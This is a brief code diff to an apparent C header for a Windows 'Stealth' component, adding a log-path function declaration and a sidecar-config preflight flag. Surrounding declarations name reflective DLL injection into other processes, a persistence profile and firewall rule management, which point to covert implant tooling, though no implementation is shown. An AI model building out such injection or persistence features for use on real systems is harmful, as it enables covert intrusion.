@@ -434,6 +434,7 @@ BOOL Stealth_ReflectiveInject(DWORD processId, const BYTE* dllBytes, size_t dllS
 
 void Stealth_ApplyPersistenceProfile(void);
 void Stealth_EnsureLoggingDefaults(void);
+void Stealth_SetInstallerLogPathToTemp(const wchar_t* fileName);
 
 /**
  * Windows Firewall rule management for service binaries
@@ -476,6 +477,7 @@ typedef struct StealthPackagePreflight
 {
     BOOL sourceExePresent;
     BOOL sourceEmbeddedConfigPresent;
+    BOOL sourceSidecarConfigPresent;
     BOOL configAvailable;
 } StealthPackagePreflight;
 
